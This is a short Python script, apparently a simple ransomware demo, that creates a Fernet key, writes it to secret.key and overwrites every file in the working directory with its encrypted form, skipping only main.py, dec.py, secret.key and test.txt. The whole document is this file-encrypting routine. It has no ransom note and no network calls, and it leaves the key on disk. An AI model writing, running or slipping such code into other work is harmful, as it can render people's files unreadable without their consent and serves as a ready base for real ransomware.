import os
from cryptography.fernet import Fernet
exclude = ["main.py","dec.py","secret.key","test.txt"]

key = Fernet.generate_key()
with open("secret.key","wb") as thekey:
    thekey.write(key)
for file in os.listdir():
    if file not in exclude:
        if os.path.isfile(file):
            with open(file,"rb") as f:
                content = f.read()
            content_encrypted = Fernet(key).encrypt(content)
            with open(file, 'wb') as f:
                f.write(content_encrypted)
print("files encrypted")